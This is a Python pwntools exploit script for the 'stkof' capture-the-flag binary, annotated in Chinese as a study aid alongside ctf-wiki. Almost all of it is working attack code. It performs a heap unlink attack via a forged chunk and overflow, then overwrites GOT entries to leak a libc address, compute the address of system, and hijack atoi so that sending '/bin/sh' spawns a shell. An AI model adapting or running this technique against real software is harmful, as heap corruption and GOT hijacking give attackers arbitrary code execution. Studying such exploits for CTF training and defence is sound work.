#coding:utf-8
from pwn import *
context(arch='amd64',os='linux')
context.log_level = 'debug'
io = process('./stkof')
elf = ELF('./stkof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def alloc(size):
	io.sendline('1')
	io.sendline(str(size))
	io.recvuntil('OK\n')
	
def edit(index,size,content):
	io.sendline('2')
	io.sendline(str(index))
	io.sendline(str(size))
	io.send(content)		
	#之所以用send是因为如果sendline的话会多读入一个'\n'
	#导致size和content的长度不匹配，导致错误
	io.recvuntil('OK\n')
	
def free(index):
	io.sendline('3')
	io.sendline(str(index))
	

head = 0x602140
#这是全局数组s的地址

#ctf-wiki介绍说，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区
#而实际查看情况也的确如此，但是本身对做题没有太大的影响

alloc(0x10)	#第一块
#这里ctf-wiki上的exp是0x100，而我是0x10，因为这个大小并没有影响

alloc(0x30) #第二块
#这里最少也要这么大

alloc(0x80)	#第三块

payload = p64(0)+p64(0x20)+p64(head+16-0x18)+p64(head+16-0x10)+p64(0x20)
payload = payload.ljust(0x30,'a')
payload += p64(0x30)+p64(0x90)
edit(2,len(payload),payload)
#在0x30的块中，构造一个size为0x20，fd=head+16-0x18，bk=head+16-0x10 的块
#并在之后再构造下一个块的prev_size=0x20
#为什么要构造prev_size=20呢
#因为unlink的时候会有一个检查：
#__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)
#如果不等会报错
#然后填充到长度为0x30，然后溢出到下一个0x80的块
#在这个块中构造prev_size=0x30，size=0x90
#注意：这里的prev_size并不是前一块的size，而是我们构造的块与这一块的偏移
#是为了能在unlink的时候找到的是我们构造的块
#注意：这个块的prev_inuse为0，即size的最后一位为0，代表前一块是空闲的状态，未分配

#gdb.attach(io,'b *0x400B42')
#raw_input('en: \n')

free(3)
#执行free(3)，即free我们填充的size为0x90的块，这时候，由_int_free函数中的
#        if (!prev_inuse(p)) {
#            prevsize = prev_size(p);
#            size += prevsize;
#            p = chunk_at_offset(p, -((long) prevsize));
#            unlink(av, p, bck, fwd);
#        }
#就会对后面的块即我们构造的块进行unlink
#unlink的具体事项ctf-wiki在这一章讲的非常详细

io.recvuntil('OK\n')

free_got = elf.got['free']
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']
puts_plt = elf.plt['puts']



payload = p64(0)+p64(free_got)+p64(puts_got)+p64(atoi_got)
edit(2,len(payload),payload)
#因为此时的第二块指的是head-8，所以首先要填充8位
#然后修改s[0]=free_got，s[1]=puts_got，s[2]=atoi_got

payload = p64(puts_plt)
edit(0,len(payload),payload)
#这样就可以修改 *s[0]即*free_got=puts_plt
#之后再调用free函数的时候就会调用puts了

free(1)
#free(1)就相当于puts(s[1])，就会泄露puts函数的地址
#利用这个地址以及libc，可以计算出libc_base，以及system_addr

leak = io.recvuntil('\nOK\n')[:6]
puts_addr = u64(leak.ljust(8,'\x00'))
log.success('puts addr: '+hex(puts_addr))
libc_base = puts_addr - libc.symbols['puts']
log.success('libc_base: '+hex(libc_base))
sys_addr = libc_base + libc.symbols['system']
log.success('sys_addr: '+hex(sys_addr))

payload = p64(sys_addr)
edit(2,len(payload),payload)
#这里，使s[2]即*atoi_got=sys_addr
#之后再调用atoi的时候就相当于调用system
#但是/bin/sh呢？

#gdb.attach(io,'b *0x400D29')
#raw_input('en: ')

payload = '/bin/sh\x00'
io.sendline(payload)
#其实atoi这个函数是在主函数中把我们输入的选项的字符转换成数字的，且可输入的大小有10字节
#我们就可以直接输入/bin/sh字符串，然后当成atoi即system的参数执行，即可getshell
#这里ctf-wiki中用的是/bin/sh字符串在libc的地址，其实是不对的

io.interactive()

